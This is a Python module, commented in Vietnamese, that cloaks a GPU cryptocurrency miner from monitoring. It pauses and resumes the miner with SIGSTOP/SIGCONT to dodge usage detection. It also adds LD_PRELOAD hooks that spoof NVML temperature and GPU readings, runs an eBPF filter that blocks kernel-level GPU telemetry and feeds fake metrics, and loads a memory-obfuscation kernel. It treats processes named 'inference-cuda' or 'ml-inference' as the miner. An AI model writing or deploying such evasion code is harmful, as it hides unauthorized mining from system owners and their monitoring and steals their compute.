# -*- coding: utf-8 -*-
"""
GPU Cloaking Manager – triển khai Time-based Evasion & eBPF Telemetry Filter cho các kỹ thuật GPU cloaking.

Ý tưởng chính:
    • Duy trì vòng lặp WORK_MS / SLEEP_MS để bật/tạm dừng tiến trình khai thác GPU.
    • Sử dụng tín hiệu SIGCONT / SIGSTOP lên PID của miner để tránh thao tác driver phức tạp.
    • Tích hợp eBPF Telemetry Filter để chặn GPU monitoring ở kernel space.
    • Cho phép tuỳ chỉnh thông số qua biến môi trường hoặc tệp cấu hình.
    • Chuẩn bị sẵn hook chạy kernel Memory Pattern Obfuscation (nếu **ENABLE_MPO=1**).

Cách dùng
---------
Trong start_mining.py:
    gpu_process = start_mining_process(...)
    from mining_environment.scripts.gpu_cloaking_manager import GPUCloakingManager
    cloaker = GPUCloakingManager(gpu_process.pid)
    cloaker.start()

Biến môi trường
---------------
• WORK_MS  (mặc định 800)   – thời gian burst tính bằng ms.
• SLEEP_MS (mặc định 200)   – thời gian ngủ.
• ENABLE_MPO (0/1)          – chạy kernel Memory Pattern Obfuscation song song.
• ENABLE_EBPF_CLOAK (0/1)   – bật eBPF Telemetry Filter.
• EBPF_CONFIG_PATH          – đường dẫn file cấu hình eBPF.
"""

import os
import signal
import threading
import time
import logging
import subprocess
from pathlib import Path
from typing import Optional, Dict, Any

try:
    import ctypes
except ImportError:
    ctypes = None  # một số môi trường không cần MPO

# Import eBPF Telemetry Filter
try:
    from ..ebpf.userspace.ebpf_manager import EBPFTelemetryFilter, is_ebpf_available
    EBPF_AVAILABLE = True
except ImportError:
    EBPF_AVAILABLE = False
    EBPFTelemetryFilter = None

# ---- helper log JSON ----
try:
    from ..telemetry.feature_logger import log_gpu_feature  # type: ignore
except ImportError:  # pragma: no cover
    def log_gpu_feature(*_args, **_kwargs):  # type: ignore
        pass

# Import GPU cloaking logger
try:
    from ...scripts.module_loggers import get_gpu_cloaking_logger, log_gpu_cloaking_operation
    gpu_cloak_logger = get_gpu_cloaking_logger()
except ImportError:
    # Fallback nếu không có logger
    class DummyLogger:
        def info(self, *args, **kwargs): pass
        def error(self, *args, **kwargs): pass
        def warning(self, *args, **kwargs): pass
    gpu_cloak_logger = DummyLogger()
    def log_gpu_cloaking_operation(*args, **kwargs): pass

# ---------- logging ----------
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

logging.basicConfig(
    level=os.getenv('GPU_CLOAK_LOG_LEVEL', 'INFO'),
    format='%(asctime)s [%(levelname)s] GPUCloak: %(message)s',
    handlers=[
        logging.FileHandler(Path(LOGS_DIR) / 'gpu_cloaking_manager.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('gpu_cloaking_manager')

# ---------- helper class ----------
class GPUCloakingManager:
    """Điều phối Time-based Evasion và eBPF Telemetry Filter cho một process GPU miner."""

    def __init__(self, target_pid: int, work_ms: Optional[int] = None, sleep_ms: Optional[int] = None, 
                 stop_event: Optional[threading.Event] = None, ebpf_config_path: Optional[str] = None):
        self.pid = target_pid
        self.work_ms = int(os.getenv('WORK_MS', work_ms or 800))
        self.sleep_ms = int(os.getenv('SLEEP_MS', sleep_ms or 200))
        self.stop_event = stop_event or threading.Event()
        
        # Threading components
        self._thread: Optional[threading.Thread] = None
        self.mpo_thread: Optional[threading.Thread] = None
        
        # eBPF Telemetry Filter
        self.ebpf_filter: Optional[EBPFTelemetryFilter] = None
        self.ebpf_config_path = ebpf_config_path or os.getenv('EBPF_CONFIG_PATH')
        self.ebpf_enabled = os.getenv('ENABLE_EBPF_CLOAK', '0') == '1'
        
        # Cloaking strategies status
        self.strategies_status = {
            'time_based_evasion': False,
            'memory_pattern_obfuscation': False,
            'ebpf_telemetry_filter': False,
            'nvml_interception': False
        }
        
        # Khởi tạo biến môi trường cho NVML interception
        self._initialize_nvml_interception()

    # ---------------- NVML Interception -----------------
    def _initialize_nvml_interception(self) -> bool:
        """
        Khởi tạo cơ chế chặn NVML API để giả lập các giá trị GPU.
        
        Xử lý các vấn đề phổ biến với tempspoof và các hook NVML khác.
        """
        enable_temp_spoof = os.getenv('ENABLE_TEMP_SPOOF', '0') == '1'
        enable_nvml_hijack = os.getenv('ENABLE_NVML_IPC_HIJACKING', '0') == '1'
        
        if not (enable_temp_spoof or enable_nvml_hijack):
            logger.debug("Chế độ NVML interception bị tắt")
            return False
            
        try:
            # Kiểm tra LD_PRELOAD có chứa các thư viện cần thiết không
            ld_preload = os.environ.get('LD_PRELOAD', '')
            hooks = []
            
            if enable_temp_spoof and '/opt/hooks/libtempspoof.so' not in ld_preload:
                hooks.append('/opt/hooks/libtempspoof.so')
                
            if enable_nvml_hijack and '/opt/hooks/libgpuhook.so' not in ld_preload:
                hooks.append('/opt/hooks/libgpuhook.so')
                
            # Thêm hooks vào LD_PRELOAD nếu cần
            if hooks:
                if ld_preload:
                    os.environ['LD_PRELOAD'] = ld_preload + ':' + ':'.join(hooks)
                else:
                    os.environ['LD_PRELOAD'] = ':'.join(hooks)
                logger.info(f"Đã thêm {len(hooks)} hook NVML vào LD_PRELOAD")
            
            # Kiểm tra xem libtempspoof có thể tìm thấy hàm gốc không
            if enable_temp_spoof:
                # Thử thiết lập symbol linking trước
                try:
                    # Tải libnvidia-ml.so với các đường dẫn phổ biến
                    nvml_lib_paths = [
                        '/usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1',
                        '/usr/lib/libnvidia-ml.so.1',
                        '/usr/local/cuda/lib64/libnvidia-ml.so.1'
                    ]
                    
                    for lib_path in nvml_lib_paths:
                        if os.path.exists(lib_path):
                            if ctypes:
                                try:
                                    nvml_lib = ctypes.CDLL(lib_path)
                                    logger.info(f"✅ Đã tải NVML library từ {lib_path}")
                                    break
                                except Exception as e:
                                    logger.debug(f"Không thể tải {lib_path}: {e}")
                except Exception as e:
                    logger.warning(f"Không thể khởi tạo NVML symbols: {e}")
                
            # Đánh dấu chiến lược là đã kích hoạt
            self.strategies_status['nvml_interception'] = True

            # --- JSON log ---
            log_gpu_feature(
                feature="gpu_cloaking",
                state="enabled",
                parameters={"nvml_interception": True},
                message="Khởi tạo NVML interception thành công",
            )
            return True
                
        except Exception as e:
            logger.error(f"❌ Lỗi khi khởi tạo NVML interception: {e}")
            log_gpu_feature(
                feature="gpu_cloaking",
                state="error",
                parameters={"nvml_interception": False},
                error_code="IPC_ERR",
                message=str(e),
            )
            return False

    # ---------------- eBPF Telemetry Filter -----------------
    def _initialize_ebpf_filter(self) -> bool:
        """Khởi tạo eBPF Telemetry Filter nếu được bật."""
        if not self.ebpf_enabled:
            logger.debug("eBPF Telemetry Filter bị tắt")
            return True
            
        if not EBPF_AVAILABLE:
            logger.warning("⚠️ eBPF Telemetry Filter không khả dụng - thiếu dependencies")
            return False
            
        try:
            # Đặt biến môi trường để nói với script setup sử dụng mock mode
            # khi không có sẵn kernel headers
            if 'EBPF_MOCK_MODE' not in os.environ:
                kernel_version = os.uname().release
                headers_dir = f"/lib/modules/{kernel_version}/build"
                if not os.path.exists(headers_dir) or not os.path.exists(f"{headers_dir}/Makefile"):
                    logger.warning(f"⚠️ Kernel headers không tìm thấy tại {headers_dir} - sử dụng mock mode")
                    os.environ['EBPF_MOCK_MODE'] = 'true'
            
            # Tạo đối tượng filter
            self.ebpf_filter = EBPFTelemetryFilter(self.ebpf_config_path)
        except Exception as e:
            logger.error(f"❌ Không thể khởi tạo EBPFTelemetryFilter: {e}")
            return False
            
        # Kiểm tra nếu filter đã được khởi tạo đúng
        if self.ebpf_filter is None:
            logger.error("❌ EBPFTelemetryFilter là None")
            return False
        
        # ---------------- Bắt đầu lọc với xử lý lỗi cẩn thận -----------------
        try:
            # Kiểm tra phương thức start_filtering tồn tại và callable
            if not callable(getattr(self.ebpf_filter, 'start_filtering', None)):
                logger.error("❌ start_filtering không hợp lệ hoặc không tồn tại")
                return False

            success = self.ebpf_filter.start_filtering()
            if success:
                logger.info("✅ eBPF Telemetry Filter đã khởi động thành công")
                log_gpu_feature(
                    feature="gpu_cloaking",
                    state="enabled",
                    parameters={"ebpf_filter": True},
                    message="eBPF Telemetry Filter khởi động thành công",
                )
            else:
                logger.warning("⚠️ eBPF Telemetry Filter đang chạy ở MOCK MODE (giả lập)")
                log_gpu_feature(
                    feature="gpu_cloaking",
                    state="enabled",
                    parameters={"ebpf_filter": "mock"},
                    message="eBPF Telemetry Filter chạy ở chế độ MOCK",
                )

            # Đánh dấu trạng thái và trả về
            self.strategies_status['ebpf_telemetry_filter'] = True
            return True

        except Exception as call_error:
            logger.error(f"❌ Lỗi khi gọi start_filtering: {call_error}")
            # Nếu lỗi liên quan NoneType/concat – chuyển sang mock mode
            if "NoneType" in str(call_error) or "concat" in str(call_error):
                logger.warning("⚠️ Phát hiện lỗi NoneType/concat - chuyển sang MOCK mode")
                if hasattr(self.ebpf_filter, 'use_mock_mode'):
                    self.ebpf_filter.use_mock_mode = True
                self.strategies_status['ebpf_telemetry_filter'] = True
                log_gpu_feature(
                    feature="gpu_cloaking",
                    state="error",
                    parameters={"ebpf_filter": False},
                    error_code="EBPF_ERR",
                    message=str(call_error),
                )
                return True
            return False
    
    def _stop_ebpf_filter(self):
        """Dừng eBPF Telemetry Filter."""
        if self.ebpf_filter:
            try:
                self.ebpf_filter.stop_filtering()
                logger.info("🛑 eBPF Telemetry Filter đã dừng")
                self.strategies_status['ebpf_telemetry_filter'] = False
            except Exception as e:
                logger.error("❌ Lỗi khi dừng eBPF filter: %s", e)
            finally:
                self.ebpf_filter = None

    # ---------------- MPO (memory pattern obfuscation) -----------------
    def _run_memory_obfuscation(self):
        """Tải .so dummy kernel nếu ENABLE_MPO=1 và thư viện tồn tại."""
        logger.debug("Bắt đầu quá trình nạp thư viện MPO...")
        if ctypes is None:
            logger.warning("Thư viện ctypes không khả dụng, không thể nạp MPO. Bỏ qua.")
            return

        lib_path = os.getenv('MPO_LIB', '/opt/mpo/libmpo.so')
        logger.info(f"Đang kiểm tra thư viện MPO tại đường dẫn: {lib_path}")

        if not Path(lib_path).is_file():
            logger.error(f"LỖI: Không tìm thấy thư viện MPO tại {lib_path}. Không thể nạp.")
            return
        
        logger.info(f"Thư viện MPO tồn tại. Đang tiến hành nạp bằng ctypes...")
        try:
            lib = ctypes.CDLL(lib_path)
            logger.info(f"✅ Nạp thành công thư viện MPO từ {lib_path}")
            
            if hasattr(lib, 'launch_mpo_kernel'):
                logger.info("Hàm 'launch_mpo_kernel' tồn tại. Đang chuẩn bị khởi chạy kernel...")
                lib.launch_mpo_kernel.restype = None
                lib.launch_mpo_kernel()
                self.strategies_status['memory_pattern_obfuscation'] = True
                logger.info("✅ Kernel MPO đã được khởi chạy thành công.")
            else:
                logger.error("LỖI: Thư viện MPO đã được nạp nhưng không tìm thấy hàm 'launch_mpo_kernel'.")
        except Exception as exc:
            logger.error(f"LỖI NGHIÊM TRỌNG khi đang nạp hoặc thực thi MPO từ {lib_path}: {exc}", exc_info=True)

    # ---------------- Main duty-cycle loop -----------------
    def _duty_cycle_loop(self):
        logger.info(
            "🚀 Bắt đầu GPU Cloaking: WORK_MS=%d, SLEEP_MS=%d, PID=%d",
            self.work_ms, self.sleep_ms, self.pid
        )
        
        # Initialize eBPF filter first (kernel-level protection)
        ebpf_success = self._initialize_ebpf_filter()
        if self.ebpf_enabled and not ebpf_success:
            logger.warning("⚠️ Tiếp tục mà không có eBPF filter")
        
        # Initialize MPO if enabled
        enable_mpo = os.getenv('ENABLE_MPO', '0') == '1'
        if enable_mpo:
            self.mpo_thread = threading.Thread(target=self._run_memory_obfuscation, daemon=True)
            self.mpo_thread.start()

        work_sec = self.work_ms / 1000.0
        sleep_sec = self.sleep_ms / 1000.0
        
        # Mark time-based evasion as active
        self.strategies_status['time_based_evasion'] = True
        
        # Log active strategies
        active_strategies = [k for k, v in self.strategies_status.items() if v]
        logger.info("🎭 Các chiến lược cloaking đang hoạt động: %s", ', '.join(active_strategies))

        # ✅ Check if target PID is mining process - skip time-based evasion
        is_mining_process = False
        try:
            with open(f"/proc/{self.pid}/cmdline", 'r') as f:
                cmdline = f.read()
            
            # Skip time-based evasion for mining processes
            if "inference-cuda" in cmdline or "ml-inference" in cmdline:
                is_mining_process = True
                logger.info(f"🎮 [MINING-EXCLUSION] Detected mining process PID {self.pid} - skipping time-based evasion")
                logger.info(f"🎮 [MINING-EXCLUSION] Command line: {cmdline.strip()}")
                
                # Keep other cloaking strategies active but skip SIGSTOP/SIGCONT cycling
                while not self.stop_event.is_set():
                    time.sleep(30)  # Just monitor, don't interfere with mining
                    
                logger.info(f"🎮 [MINING-EXCLUSION] Mining process monitoring ended for PID {self.pid}")
                return
        except (OSError, IOError):
            logger.debug(f"Could not read cmdline for PID {self.pid} - proceeding with normal time-based evasion")

        while not self.stop_event.is_set():
            # Resume process
            try:
                os.kill(self.pid, signal.SIGCONT)
            except ProcessLookupError:
                logger.error("Process %d không tồn tại. Dừng cloaker.", self.pid)
                self.stop_event.set(); break
            time.sleep(work_sec)

            # Pause process
            try:
                os.kill(self.pid, signal.SIGSTOP)
            except ProcessLookupError:
                logger.error("Process %d không tồn tại. Dừng cloaker.", self.pid)
                self.stop_event.set(); break
            time.sleep(sleep_sec)

        # Cleanup on exit
        self.strategies_status['time_based_evasion'] = False
        
        # ensure miner resumed on exit
        try:
            os.kill(self.pid, signal.SIGCONT)
        except ProcessLookupError:
            pass
            
        logger.info("🛑 GPUCloakingManager duty cycle dừng.")

    # ---------------- public API -----------------
    def start(self):
        """Khởi động GPU Cloaking Manager với tất cả các chiến lược."""
        if self._thread and self._thread.is_alive():
            logger.warning("GPUCloakingManager đã chạy từ trước.")
            gpu_cloak_logger.log_time_based_evasion(
                action="START",
                status="SUCCESS",
                target_pid=self.pid,
                error_details="Already running"
            )
            return
        
        logger.info("🚀 Khởi động GPUCloakingManager cho PID %d", self.pid)
        gpu_cloak_logger.log_time_based_evasion(
            action="START",
            status="SUCCESS",
            work_ms=self.work_ms,
            sleep_ms=self.sleep_ms,
            target_pid=self.pid
        )
        self._thread = threading.Thread(target=self._duty_cycle_loop, daemon=True)
        self._thread.start()

    def stop(self):
        """Dừng tất cả các chiến lược cloaking."""
        logger.info("🛑 Đang dừng GPUCloakingManager...")
        
        # Signal stop to main thread
        self.stop_event.set()
        
        # Wait for main thread to finish
        if self._thread:
            self._thread.join(timeout=5)
        
        # Stop eBPF filter
        self._stop_ebpf_filter()
        
        # MPO thread will stop automatically (daemon thread)
        if self.mpo_thread and self.mpo_thread.is_alive():
            logger.info("🛑 MPO thread sẽ dừng tự động")
        
        logger.info("✅ GPUCloakingManager đã được dừng hoàn toàn.")
    
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái hiện tại của các chiến lược cloaking."""
        status = {
            'pid': self.pid,
            'running': self._thread.is_alive() if self._thread else False,
            'strategies': self.strategies_status.copy(),
            'config': {
                'work_ms': self.work_ms,
                'sleep_ms': self.sleep_ms,
                'ebpf_enabled': self.ebpf_enabled,
                'ebpf_config_path': self.ebpf_config_path
            }
        }
        
        # Add eBPF filter status if available
        if self.ebpf_filter:
            status['ebpf_status'] = self.ebpf_filter.get_status()
        
        return status
    
    def update_fake_metrics(self, metrics: Dict[str, int]):
        """Cập nhật fake metrics cho eBPF filter."""
        if self.ebpf_filter:
            self.ebpf_filter.update_fake_metrics(metrics)
            logger.info("📊 Đã cập nhật fake metrics: %s", metrics)
        else:
            logger.warning("⚠️ eBPF filter không khả dụng để cập nhật metrics")
    
    def is_process_alive(self) -> bool:
        """Kiểm tra xem target process còn sống không."""
        try:
            os.kill(self.pid, 0)  # Signal 0 để kiểm tra process existence
            return True
        except ProcessLookupError:
            return False
        except PermissionError:
            return True  # Process exists but we don't have permission 